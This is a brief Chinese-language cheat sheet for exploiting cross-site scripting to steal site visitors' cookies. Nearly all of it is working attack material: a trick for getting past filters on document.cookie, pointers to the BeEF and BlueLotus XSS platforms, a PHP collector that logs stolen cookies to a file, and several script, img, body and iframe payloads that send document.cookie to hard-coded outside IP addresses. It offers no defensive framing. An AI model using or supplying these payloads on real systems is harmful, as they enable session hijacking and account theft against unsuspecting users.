漏洞利用
XSS注入在线脚本危害：
通过脚本获取访问者信息，访问者的cookie，操作用户客户端等操作。
```
<script>alert(document.cookie)</script>

绕过document.cookie：
Object.keys(window).indexOf("document")  //查看document返回的坐标，如=> 2，下面就用2获取cookie
window[Object.keys(window)[2]].cookie 



1. kali中的beef (apt search beef-xss)
    开启监控，生成一个xxx.com:3000/hook.js在线脚本
    在网站中引入此JS
    进入xss后台管理平台
2. BLUE-LOTUS
    用网站搭建一个蓝恋花xss后台管理平台
3. 其他XSS测试平台

4.自建脚本，如：
<?php
	$cookie = $_GET['cookie'];
	$time = date('Y-m-d h:i:s', time());
	$log = fopen("cookie.txt", "a");
	fwrite($log,$time.':    '. $cookie . "\n");
	fclose($log);
?>

<script>location.href="http://1.92.88.247/cookie/cookie.php?cookie="+document.cookie</script>
<img src="" οnerrοr=location.href="http://47.98.193.145/1.php?cookie="+document.cookie>

<body οnlοad=location.href="http://47.98.193.145/1111/127.php?cookie="+document.cookie>
<body onload="document.location.href='http://47.98.193.145/1111/127.php?1='+document.cookie"></body>
<body onload="document.location.href='http://47.98.193.145/1111/127.php?1='+document.cookie">

<iframe οnlοad=document.location='http://47.98.193.145:1470/?cookie='+document.cookie>

```